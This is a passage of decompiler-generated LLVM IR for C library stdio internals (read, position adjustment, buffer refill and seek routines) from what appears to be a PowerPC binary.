dec_label_pc_100096d4:                            ; preds = %dec_label_pc_100096a8, %dec_label_pc_100096b4
  %v0_100096e0 = phi i32 [ %tmp, %dec_label_pc_100096a8 ], [ %v0_100096d4.pre, %dec_label_pc_100096b4 ]
  %v1_100096d4 = inttoptr i32 %v0_100096e0 to i16*
  %v2_100096d4 = load i16, i16* %v1_100096d4, align 2
  %v3_100096d4 = zext i16 %v2_100096d4 to i32
  store i32 %v3_100096d4, i32* %r0.global-to-local, align 4
  %v1_100096d8 = and i32 %v3_100096d4, 64
  store i32 %v1_100096d8, i32* %r9.global-to-local, align 4
  %v3_100096d8 = icmp eq i32 %v1_100096d8, 0
  br i1 %v3_100096d8, label %dec_label_pc_100096f0, label %dec_label_pc_100096e0

dec_label_pc_100096e0:                            ; preds = %dec_label_pc_100096d4
  store i32 %v0_100096e0, i32* @r3, align 4
  store i32 268474088, i32* @lr, align 4
  %v0_100096e4 = call i32 @__stdio_wcommit()
  %v3_100096e8 = icmp eq i32 %v0_100096e4, 0
  br i1 %v3_100096e8, label %dec_label_pc_100096f0, label %dec_label_pc_10009758

dec_label_pc_100096f0:                            ; preds = %dec_label_pc_100096e0, %dec_label_pc_100096d4
  %v0_100096f0 = load i32, i32* @r30, align 4
  %v3_100096f0 = icmp eq i32 %v0_100096f0, 1
  br i1 %v3_100096f0, label %dec_label_pc_100096f8, label %dec_label_pc_100096f0.dec_label_pc_1000970c_crit_edge

dec_label_pc_100096f0.dec_label_pc_1000970c_crit_edge: ; preds = %dec_label_pc_100096f0
  br label %dec_label_pc_1000970c

dec_label_pc_100096f8:                            ; preds = %dec_label_pc_100096f0
  %v0_100096f8 = load i32, i32* @r31, align 4
  %v1_100096f8 = inttoptr i32 %v0_100096f8 to i16*
  %v2_100096fc = ptrtoint i32* %stack_var_-56 to i32
  store i32 268474116, i32* @lr, align 4
  %v4_10009700 = call i32 @__stdio_adjust_position(i16* %v1_100096f8, i32 %v2_100096fc)
  %v1_10009704 = icmp slt i32 %v4_10009700, 0
  br i1 %v1_10009704, label %dec_label_pc_10009758, label %dec_label_pc_100096f8.dec_label_pc_1000970c_crit_edge

dec_label_pc_100096f8.dec_label_pc_1000970c_crit_edge: ; preds = %dec_label_pc_100096f8
  %v0_1000970c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000970c

dec_label_pc_1000970c:                            ; preds = %dec_label_pc_100096f0.dec_label_pc_1000970c_crit_edge, %dec_label_pc_100096f8.dec_label_pc_1000970c_crit_edge
  %v0_1000970c = phi i32 [ %v0_100096f0, %dec_label_pc_100096f0.dec_label_pc_1000970c_crit_edge ], [ %v0_1000970c.pre, %dec_label_pc_100096f8.dec_label_pc_1000970c_crit_edge ]
  %v0_10009710 = load i32, i32* @r31, align 4
  store i32 268474140, i32* @lr, align 4
  %v5_10009718 = call i32 @__stdio_seek(i32 %v0_10009710, i32* nonnull %stack_var_-56, i32 %v0_1000970c)
  %v1_1000971c = icmp slt i32 %v5_10009718, 0
  br i1 %v1_1000971c, label %dec_label_pc_10009758, label %dec_label_pc_10009724

dec_label_pc_10009724:                            ; preds = %dec_label_pc_1000970c
  %v0_10009724 = load i32, i32* @r31, align 4
  %v1_10009724 = inttoptr i32 %v0_10009724 to i16*
  %v2_10009724 = load i16, i16* %v1_10009724, align 2
  %v3_10009724 = zext i16 %v2_10009724 to i32
  store i32 %v3_10009724, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000972c = add i32 %v0_10009724, 8
  %v2_1000972c = inttoptr i32 %v1_1000972c to i32*
  %v3_1000972c = load i32, i32* %v2_1000972c, align 4
  store i32 %v3_1000972c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v3_10009734 = add i32 %v0_10009724, 2
  %v4_10009734 = inttoptr i32 %v3_10009734 to i8*
  store i8 0, i8* %v4_10009734, align 1
  %v0_10009738 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009738 = and i32 %v0_10009738, 65464
  store i32 %v1_10009738, i32* %r0.global-to-local, align 4
  %v0_1000973c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000973c = load i32, i32* @r31, align 4
  %v2_1000973c = add i32 %v1_1000973c, 44
  %v3_1000973c = inttoptr i32 %v2_1000973c to i32*
  store i32 %v0_1000973c, i32* %v3_1000973c, align 4
  %v0_10009740 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009740 = load i32, i32* @r31, align 4
  %v2_10009740 = add i32 %v1_10009740, 28
  %v3_10009740 = inttoptr i32 %v2_10009740 to i32*
  store i32 %v0_10009740, i32* %v3_10009740, align 4
  %v0_10009744 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009744 = trunc i32 %v0_10009744 to i16
  %v2_10009744 = load i32, i32* @r31, align 4
  %v3_10009744 = inttoptr i32 %v2_10009744 to i16*
  store i16 %v1_10009744, i16* %v3_10009744, align 2
  %v0_10009748 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009748 = load i32, i32* @r31, align 4
  %v2_10009748 = add i32 %v1_10009748, 16
  %v3_10009748 = inttoptr i32 %v2_10009748 to i32*
  store i32 %v0_10009748, i32* %v3_10009748, align 4
  %v0_1000974c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000974c = load i32, i32* @r31, align 4
  %v2_1000974c = add i32 %v1_1000974c, 20
  %v3_1000974c = inttoptr i32 %v2_1000974c to i32*
  store i32 %v0_1000974c, i32* %v3_1000974c, align 4
  %v0_10009750 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009750 = load i32, i32* @r31, align 4
  %v2_10009750 = add i32 %v1_10009750, 24
  %v3_10009750 = inttoptr i32 %v2_10009750 to i32*
  store i32 %v0_10009750, i32* %v3_10009750, align 4
  br label %dec_label_pc_1000975c

dec_label_pc_10009758:                            ; preds = %dec_label_pc_100096e0, %dec_label_pc_1000970c, %dec_label_pc_100096f8
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_1000975c

dec_label_pc_1000975c:                            ; preds = %dec_label_pc_10009724, %dec_label_pc_10009758
  %v0_1000975c = load i32, i32* @r28, align 4
  %v3_1000975c = icmp eq i32 %v0_1000975c, 0
  br i1 %v3_1000975c, label %dec_label_pc_10009764, label %dec_label_pc_10009770

dec_label_pc_10009764:                            ; preds = %dec_label_pc_1000975c
  %v2_10009764 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10009764, i32* @r3, align 4
  %v0_1000976c = call i32 @__pthread_return_void()
  br label %dec_label_pc_10009770

dec_label_pc_10009770:                            ; preds = %dec_label_pc_1000975c, %dec_label_pc_10009694, %dec_label_pc_10009764
  store i32 %v0_10009670, i32* %r0.global-to-local, align 4
  %v0_10009774 = load i32, i32* @r30, align 4
  ret i32 %v0_10009774

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @__pthread_return_0, { 8, 4, 3, 2, 26, 25, 24, 23, 22, 21, 0, 42, 44, 43, 35, 41, 40, 39, 38, 14, 13, 12, 11, 10, 20, 19, 18, 17, 16, 15, 9, 32, 31, 30, 34, 33, 37, 29, 36, 1, 28, 27, 7, 6, 5 }
  uselistorder i32 ()* @__pthread_return_void, { 10, 9, 8, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 1, 0, 47, 46, 51, 50, 49, 48, 41, 40, 12, 11, 35, 34, 33, 32, 31, 30, 39, 38, 37, 36, 45, 44, 29, 28, 43, 42, 27, 26, 25, 24, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 56, { 2, 4, 3, 0, 1 }
  uselistorder i32 52, { 5, 6, 8, 0, 3, 1, 7, 4, 2 }
  uselistorder i32 22, { 1, 13, 2, 3, 9, 4, 10, 12, 5, 15, 6, 14, 7, 0, 11, 8 }
  uselistorder label %dec_label_pc_10009770, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000975c, { 1, 0 }
  uselistorder label %dec_label_pc_10009758, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000970c, { 1, 0 }
  uselistorder label %dec_label_pc_100096d4, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10009794 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100097a0 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100097a8 = and i16 %v3_100097a0, 4
  %v3_100097a8 = icmp eq i16 %v1_100097a8, 0
  br i1 %v3_100097a8, label %dec_label_pc_100097b0, label %dec_label_pc_100097e8

dec_label_pc_100097b0:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_100097bc, label %dec_label_pc_100097b4

dec_label_pc_100097b4:                            ; preds = %dec_label_pc_100097b0
  br label %dec_label_pc_100097bc

dec_label_pc_100097bc:                            ; preds = %dec_label_pc_100097b0, %dec_label_pc_100097b4
  %v1_100097bc = add i32 %tmp, 4
  %v2_100097bc = inttoptr i32 %v1_100097bc to i32*
  %v3_100097bc = load i32, i32* %v2_100097bc, align 4
  store i32 %v3_100097bc, i32* %r3.global-to-local, align 4
  store i32 268474308, i32* @lr, align 4
  %v1_100097c0 = call i32 @__libc_read(i32 %v3_100097bc)
  store i32 %v1_100097c0, i32* %r3.global-to-local, align 4
  %v2_100097c4 = icmp sgt i32 %v1_100097c0, 0
  br i1 %v2_100097c4, label %dec_label_pc_100097e8, label %dec_label_pc_100097cc

dec_label_pc_100097cc:                            ; preds = %dec_label_pc_100097bc
  %v3_100097c4 = icmp eq i32 %v1_100097c0, 0
  %v0_100097cc = load i32, i32* @r31, align 4
  %v1_100097cc = inttoptr i32 %v0_100097cc to i16*
  %v2_100097cc = load i16, i16* %v1_100097cc, align 2
  br i1 %v3_100097c4, label %dec_label_pc_100097d4, label %dec_label_pc_100097dc

dec_label_pc_100097d4:                            ; preds = %dec_label_pc_100097cc
  %v1_100097d4 = or i16 %v2_100097cc, 4
  br label %dec_label_pc_100097e4

dec_label_pc_100097dc:                            ; preds = %dec_label_pc_100097cc
  %v1_100097dc = or i16 %v2_100097cc, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100097e4

dec_label_pc_100097e4:                            ; preds = %dec_label_pc_100097d4, %dec_label_pc_100097dc
  %v1_100097d4.sink.off0 = phi i16 [ %v1_100097d4, %dec_label_pc_100097d4 ], [ %v1_100097dc, %dec_label_pc_100097dc ]
  store i16 %v1_100097d4.sink.off0, i16* %v1_100097cc, align 2
  %v0_100097f8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100097e8

dec_label_pc_100097e8:                            ; preds = %entry, %dec_label_pc_100097bc, %dec_label_pc_100097e4
  %v0_100097f8 = phi i32 [ 0, %entry ], [ %v1_100097c0, %dec_label_pc_100097bc ], [ %v0_100097f8.pre, %dec_label_pc_100097e4 ]
  store i32 %v0_10009794, i32* @r31, align 4
  ret i32 %v0_100097f8

; uselistorder directives
  uselistorder i16 %v2_100097cc, { 1, 0 }
  uselistorder i32 %v1_100097c0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_100097e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100097e4, { 1, 0 }
  uselistorder label %dec_label_pc_100097bc, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_10009814 = load i16, i16* %arg1, align 2
  %v4_10009814 = zext i16 %v3_10009814 to i32
  %tmp9 = urem i16 %v3_10009814, 4
  %v3_10009818 = icmp eq i16 %tmp9, 0
  br i1 %v3_10009818, label %dec_label_pc_10009864, label %dec_label_pc_10009820

dec_label_pc_10009820:                            ; preds = %entry
  %v1_10009818 = zext i16 %tmp9 to i32
  %v1_10009820 = add nsw i32 %v1_10009818, -1
  store i32 %v1_10009820, i32* %r10.global-to-local, align 4
  %v4_10009820 = icmp eq i32 %v1_10009820, 0
  br i1 %v4_10009820, label %dec_label_pc_10009864, label %dec_label_pc_10009828

dec_label_pc_10009828:                            ; preds = %dec_label_pc_10009820
  %v1_10009828 = and i32 %v4_10009814, 2048
  %v3_10009828 = icmp eq i32 %v1_10009828, 0
  br i1 %v3_10009828, label %dec_label_pc_10009864, label %dec_label_pc_10009830

dec_label_pc_10009830:                            ; preds = %dec_label_pc_10009828
  %v2_10009830 = icmp sgt i32 %v1_10009820, 1
  br i1 %v2_10009830, label %dec_label_pc_100098dc, label %dec_label_pc_10009838

dec_label_pc_10009838:                            ; preds = %dec_label_pc_10009830
  %v2_10009838 = add i32 %tmp, 40
  %v3_10009838 = inttoptr i32 %v2_10009838 to i32*
  %v4_10009838 = load i32, i32* %v3_10009838, align 4
  %v3_1000983c = icmp eq i32 %v4_10009838, 0
  br i1 %v3_1000983c, label %dec_label_pc_10009844, label %dec_label_pc_100098dc

dec_label_pc_10009844:                            ; preds = %dec_label_pc_10009838
  %v2_10009844 = add i32 %tmp, 44
  %v3_10009844 = inttoptr i32 %v2_10009844 to i32*
  %v4_10009844 = load i32, i32* %v3_10009844, align 4
  %v2_10009848 = add i32 %tmp, 3
  %v3_10009848 = inttoptr i32 %v2_10009848 to i8*
  %v4_10009848 = load i8, i8* %v3_10009848, align 1
  %v5_10009848 = zext i8 %v4_10009848 to i32
  %v2_10009850 = sub nsw i32 %v1_10009820, %v5_10009848
  %v1_10009854 = add nsw i32 %v2_10009850, -1
  store i32 %v1_10009854, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_10009844, 1
  br i1 %tmp7, label %dec_label_pc_10009864, label %dec_label_pc_1000985c

dec_label_pc_1000985c:                            ; preds = %dec_label_pc_10009844
  %v2_1000985c = add i32 %tmp, 2
  %v3_1000985c = inttoptr i32 %v2_1000985c to i8*
  %v4_1000985c = load i8, i8* %v3_1000985c, align 1
  %v5_1000985c = zext i8 %v4_1000985c to i32
  %v2_10009860 = sub nsw i32 %v1_10009854, %v5_1000985c
  store i32 %v2_10009860, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009864

dec_label_pc_10009864:                            ; preds = %dec_label_pc_10009844, %dec_label_pc_10009828, %dec_label_pc_10009820, %entry, %dec_label_pc_1000985c
  %v0_10009888 = phi i32 [ %v1_10009854, %dec_label_pc_10009844 ], [ %v1_10009820, %dec_label_pc_10009828 ], [ 0, %dec_label_pc_10009820 ], [ 0, %entry ], [ %v2_10009860, %dec_label_pc_1000985c ]
  %v1_10009864 = and i32 %v4_10009814, 64
  %v3_10009864 = icmp eq i32 %v1_10009864, 0
  %storemerge.in.in.v = select i1 %v3_10009864, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_10009878 = add i32 %tmp, 16
  %v3_10009878 = inttoptr i32 %v2_10009878 to i32*
  %v4_10009878 = load i32, i32* %v3_10009878, align 4
  %v1_1000987c = inttoptr i32 %arg2 to i32*
  %v2_1000987c = load i32, i32* %v1_1000987c, align 4
  store i32 %v2_1000987c, i32* %r4.global-to-local, align 4
  %v1_10009880 = add i32 %arg2, 4
  %v2_10009880 = inttoptr i32 %v1_10009880 to i32*
  %v3_10009880 = load i32, i32* %v2_10009880, align 4
  store i32 %v3_10009880, i32* %r5.global-to-local, align 4
  %v2_10009884 = sub i32 %storemerge, %v4_10009878
  %v2_10009888 = add i32 %v2_10009884, %v0_10009888
  store i32 %v2_10009888, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_10009888, 0
  %v1_10009890 = zext i1 %tmp10 to i32
  %v2_10009890 = ashr i32 %v2_10009888, 31
  %v3_10009890 = and i32 %v2_10009890, -2
  %v4_10009890 = or i32 %v3_10009890, %v1_10009890
  %v2_10009894 = sub i32 %v3_10009880, %v2_10009888
  %v3_10009894 = sub i32 -1, %v2_10009888
  store i32 %v2_10009894, i32* %r10.global-to-local, align 4
  %v6_10009894 = icmp ule i32 %v2_10009894, %v3_10009894
  %v2_10009898 = sub nsw i32 -1, %v4_10009890
  %v3_10009898 = add i32 %v2_1000987c, %v2_10009898
  %v5_10009898 = zext i1 %v6_10009894 to i32
  %v6_10009898 = add i32 %v3_10009898, %v5_10009898
  store i32 %v6_10009898, i32* %v1_1000987c, align 4
  %v0_100098a0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100098a0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100098a0 = add i32 %v1_100098a0, 4
  %v3_100098a0 = inttoptr i32 %v2_100098a0 to i32*
  store i32 %v0_100098a0, i32* %v3_100098a0, align 4
  %v0_100098a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_100098a4 = inttoptr i32 %v0_100098a4 to i32*
  %v2_100098a4 = load i32, i32* %v1_100098a4, align 4
  %v1_100098a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_100098a8 = icmp sgt i32 %v2_100098a4, %v1_100098a8
  br i1 %v3_100098a8, label %dec_label_pc_100098c0, label %dec_label_pc_100098b0

dec_label_pc_100098b0:                            ; preds = %dec_label_pc_10009864
  %v4_100098a8 = icmp eq i32 %v2_100098a4, %v1_100098a8
  br i1 %v4_100098a8, label %dec_label_pc_100098b4, label %dec_label_pc_100098c4thread-pre-split

dec_label_pc_100098b4:                            ; preds = %dec_label_pc_100098b0
  %v1_100098b4 = add i32 %v0_100098a4, 4
  %v2_100098b4 = inttoptr i32 %v1_100098b4 to i32*
  %v3_100098b4 = load i32, i32* %v2_100098b4, align 4
  %v1_100098b8 = load i32, i32* %r5.global-to-local, align 4
  %v3_100098b8 = icmp ugt i32 %v3_100098b4, %v1_100098b8
  br i1 %v3_100098b8, label %dec_label_pc_100098c0, label %dec_label_pc_100098c4thread-pre-split

dec_label_pc_100098c0:                            ; preds = %dec_label_pc_100098b4, %dec_label_pc_10009864
  %v0_100098c0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100098c0 = sub i32 0, %v0_100098c0
  store i32 %v1_100098c0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100098c4

dec_label_pc_100098c4thread-pre-split:            ; preds = %dec_label_pc_100098b0, %dec_label_pc_100098b4
  %v0_100098c4.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100098c4

dec_label_pc_100098c4:                            ; preds = %dec_label_pc_100098c4thread-pre-split, %dec_label_pc_100098c0
  %v0_100098c4 = phi i32 [ %v0_100098c4.pr, %dec_label_pc_100098c4thread-pre-split ], [ %v1_100098c0, %dec_label_pc_100098c0 ]
  %tmp8 = icmp sgt i32 %v0_100098c4, -1
  br i1 %tmp8, label %dec_label_pc_100098e0, label %dec_label_pc_100098cc

dec_label_pc_100098cc:                            ; preds = %dec_label_pc_100098c4
  %v0_100098cc = call i32 @__errno_location()
  %v2_100098d4 = inttoptr i32 %v0_100098cc to i32*
  store i32 75, i32* %v2_100098d4, align 4
  %v0_100098e4.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100098e0

dec_label_pc_100098dc:                            ; preds = %dec_label_pc_10009838, %dec_label_pc_10009830
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100098e0

dec_label_pc_100098e0:                            ; preds = %dec_label_pc_100098c4, %dec_label_pc_100098cc, %dec_label_pc_100098dc
  %v0_100098e4 = phi i32 [ %v0_100098c4, %dec_label_pc_100098c4 ], [ %v0_100098e4.pre, %dec_label_pc_100098cc ], [ -1, %dec_label_pc_100098dc ]
  ret i32 %v0_100098e4

; uselistorder directives
  uselistorder i32 %v2_100098a4, { 1, 0 }
  uselistorder i32 %v2_10009888, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100098e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100098c4thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10009864, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_100098fc = load i32, i32* @lr, align 4
  store i32 %v0_100098fc, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000990c = add i32 %arg1, 8
  %v2_1000990c = inttoptr i32 %v1_1000990c to i32*
  %v3_1000990c = load i32, i32* %v2_1000990c, align 4
  %v1_10009910 = add i32 %arg1, 12
  %v2_10009910 = inttoptr i32 %v1_10009910 to i32*
  %v3_10009910 = load i32, i32* %v2_10009910, align 4
  %v2_10009914 = sub i32 %v3_10009910, %v3_1000990c
  store i32 268474652, i32* @lr, align 4
  %v3_10009918 = inttoptr i32 %v3_1000990c to i16*
  %v4_10009918 = call i32 @__stdio_READ(i16* %v3_10009918, i32 %v2_10009914, i32 %v2_10009914)
  %v0_1000991c = load i32, i32* @r29, align 4
  %v1_1000991c = add i32 %v0_1000991c, 8
  %v2_1000991c = inttoptr i32 %v1_1000991c to i32*
  %v3_1000991c = load i32, i32* %v2_1000991c, align 4
  %v2_10009920 = add i32 %v3_1000991c, %v4_10009918
  store i32 %v2_10009920, i32* %r0.global-to-local, align 4
  %v2_10009924 = add i32 %v0_1000991c, 16
  %v3_10009924 = inttoptr i32 %v2_10009924 to i32*
  store i32 %v3_1000991c, i32* %v3_10009924, align 4
  %v0_10009928 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009928 = load i32, i32* @r29, align 4
  %v2_10009928 = add i32 %v1_10009928, 20
  %v3_10009928 = inttoptr i32 %v2_10009928 to i32*
  store i32 %v0_10009928, i32* %v3_10009928, align 4
  store i32 %v0_100098fc, i32* %r0.global-to-local, align 4
  ret i32 %v4_10009918

; uselistorder directives
  uselistorder i32 %v3_1000991c, { 1, 0 }
  uselistorder i32 %v4_10009918, { 1, 0 }
  uselistorder i32 %v3_1000990c, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10009948 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10009954 = load i16, i16* %arg1, align 2
  %v4_10009954 = zext i16 %v3_10009954 to i32
  %v2_10009958 = and i32 %v4_10009954, %arg2
  %v5_10009958 = icmp eq i32 %v2_10009958, 0
  br i1 %v5_10009958, label %dec_label_pc_10009960, label %dec_label_pc_10009970

dec_label_pc_10009960:                            ; preds = %entry
  %v1_10009960 = and i32 %v4_10009954, 2176
  %v3_10009960 = icmp eq i32 %v1_10009960, 0
  br i1 %v3_10009960, label %dec_label_pc_10009968, label %dec_label_pc_1000997c

dec_label_pc_10009968:                            ; preds = %dec_label_pc_10009960
  %v2_10009968 = or i32 %v4_10009954, %arg2
  %v1_1000996c = trunc i32 %v2_10009968 to i16
  store i16 %v1_1000996c, i16* %arg1, align 2
  %v0_10009970.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009970

dec_label_pc_10009970:                            ; preds = %entry, %dec_label_pc_10009968
  %v0_10009970 = phi i32 [ %tmp, %entry ], [ %v0_10009970.pre, %dec_label_pc_10009968 ]
  %v1_10009970 = inttoptr i32 %v0_10009970 to i16*
  %v2_10009970 = load i16, i16* %v1_10009970, align 2
  %v3_10009970 = zext i16 %v2_10009970 to i32
  %v1_10009974 = and i32 %v3_10009970, 16
  %v3_10009974 = icmp eq i32 %v1_10009974, 0
  br i1 %v3_10009974, label %dec_label_pc_10009998, label %dec_label_pc_1000997c

dec_label_pc_1000997c:                            ; preds = %dec_label_pc_10009960, %dec_label_pc_10009970
  %v0_1000997c = call i32 @__errno_location()
  store i32 %v0_1000997c, i32* %r3.global-to-local, align 4
  %v2_10009984 = inttoptr i32 %v0_1000997c to i32*
  store i32 9, i32* %v2_10009984, align 4
  br label %dec_label_pc_10009988

dec_label_pc_10009988:                            ; preds = %dec_label_pc_100099a0, %dec_label_pc_1000997c
  %v0_10009988 = load i32, i32* @r31, align 4
  %v1_10009988 = inttoptr i32 %v0_10009988 to i16*
  %v2_10009988 = load i16, i16* %v1_10009988, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10009990 = or i16 %v2_10009988, 8
  br label %dec_label_pc_100099cc

dec_label_pc_10009998:                            ; preds = %dec_label_pc_10009970
  %v1_10009998 = and i32 %v3_10009970, 64
  %v3_10009998 = icmp eq i32 %v1_10009998, 0
  br i1 %v3_10009998, label %dec_label_pc_100099c0, label %dec_label_pc_100099a0

dec_label_pc_100099a0:                            ; preds = %dec_label_pc_10009998
  store i32 268474788, i32* @lr, align 4
  %v0_100099a0 = call i32 @__stdio_wcommit()
  store i32 %v0_100099a0, i32* %r3.global-to-local, align 4
  %v3_100099a4 = icmp eq i32 %v0_100099a0, 0
  br i1 %v3_100099a4, label %dec_label_pc_100099ac, label %dec_label_pc_10009988

dec_label_pc_100099ac:                            ; preds = %dec_label_pc_100099a0
  %v0_100099ac = load i32, i32* @r31, align 4
  %v1_100099ac = inttoptr i32 %v0_100099ac to i16*
  %v2_100099ac = load i16, i16* %v1_100099ac, align 2
  %v3_100099ac = zext i16 %v2_100099ac to i32
  %v1_100099b0 = add i32 %v0_100099ac, 8
  %v2_100099b0 = inttoptr i32 %v1_100099b0 to i32*
  %v3_100099b0 = load i32, i32* %v2_100099b0, align 4
  %v1_100099b4 = call i32 @__asm_rlwinm(i32 %v3_100099ac, i32 0, i32 26, i32 24)
  %v2_100099b4 = trunc i32 %v1_100099b4 to i16
  %v1_100099b8 = load i32, i32* @r31, align 4
  %v2_100099b8 = add i32 %v1_100099b8, 28
  %v3_100099b8 = inttoptr i32 %v2_100099b8 to i32*
  store i32 %v3_100099b0, i32* %v3_100099b8, align 4
  %v3_100099bc = load i32, i32* @r31, align 4
  %v4_100099bc = inttoptr i32 %v3_100099bc to i16*
  store i16 %v2_100099b4, i16* %v4_100099bc, align 2
  %v0_100099c0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100099c0

dec_label_pc_100099c0:                            ; preds = %dec_label_pc_10009998, %dec_label_pc_100099ac
  %v0_100099c0 = phi i32 [ %v0_10009970, %dec_label_pc_10009998 ], [ %v0_100099c0.pre, %dec_label_pc_100099ac ]
  %v1_100099c0 = inttoptr i32 %v0_100099c0 to i16*
  %v2_100099c0 = load i16, i16* %v1_100099c0, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100099c8 = or i16 %v2_100099c0, 1
  br label %dec_label_pc_100099cc

dec_label_pc_100099cc:                            ; preds = %dec_label_pc_10009988, %dec_label_pc_100099c0
  %v2_100099cc = phi i32 [ %v0_10009988, %dec_label_pc_10009988 ], [ %v0_100099c0, %dec_label_pc_100099c0 ]
  %storemerge.off0 = phi i16 [ %v1_10009990, %dec_label_pc_10009988 ], [ %v1_100099c8, %dec_label_pc_100099c0 ]
  %v3_100099cc = inttoptr i32 %v2_100099cc to i16*
  store i16 %storemerge.off0, i16* %v3_100099cc, align 2
  store i32 %v0_10009948, i32* @r31, align 4
  %v0_100099e0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100099e0

; uselistorder directives
  uselistorder i32 %v4_10009954, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 2, 1, 3, 4, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 6, 3, 2, 1, 5, 4, 0 }
  uselistorder i32 64, { 0, 4, 5, 6, 8, 2, 3, 7, 9, 1 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100099cc, { 1, 0 }
  uselistorder label %dec_label_pc_100099c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000997c, { 1, 0 }
  uselistorder label %dec_label_pc_10009970, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_100099e8 = load i32, i32* @lr, align 4
  store i32 %v0_100099e8, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_100099f0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_100099fc = add i32 %arg1, 4
  %v2_100099fc = inttoptr i32 %v1_100099fc to i32*
  %v3_100099fc = load i32, i32* %v2_100099fc, align 4
  %v2_10009a00 = load i32, i32* %arg2, align 4
  %v1_10009a04 = add i32 %tmp, 4
